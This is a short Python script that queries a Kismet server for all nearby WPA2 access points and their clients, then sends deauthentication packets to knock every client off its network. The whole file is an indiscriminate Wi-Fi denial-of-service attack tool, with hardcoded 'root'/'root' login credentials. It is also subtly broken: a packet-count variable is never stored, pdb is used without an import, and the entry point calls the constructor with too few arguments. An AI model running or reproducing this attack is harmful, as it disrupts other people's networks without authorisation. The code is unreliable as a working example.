import kismet_rest
import deauthenticator

class Devices():
    device = None
    iface = None

    def __init__(self, username: str, password: str, iface: str, num_deauth_packets: int):
        self.device = kismet_rest.Devices()
        self.iface = iface
        self.device.set_login(username, password)

    def get_access_points(self):
        for ap in self.device.dot11_access_points():
            if "WPA2" in ap['kismet.device.base.crypt']:
                self.clients(ap)

    def clients(self, access_point):
        ap_mac_addr = access_point['kismet.device.base.macaddr']
        for client in self.device.dot11_clients_of(access_point['kismet.device.base.key']):
            client_mac = client['kismet.device.base.macaddr']
            resp = deauthenticator.deauth(self.iface, num_deauth_packets, ap_mac_addr, client_mac)
            print(client)


    def devices(self):
        for device in self.device.all():
            pdb.set_trace()

if __name__ == "__main__":
    devices = Devices("root", "root", 1)
    devices.get_access_points()
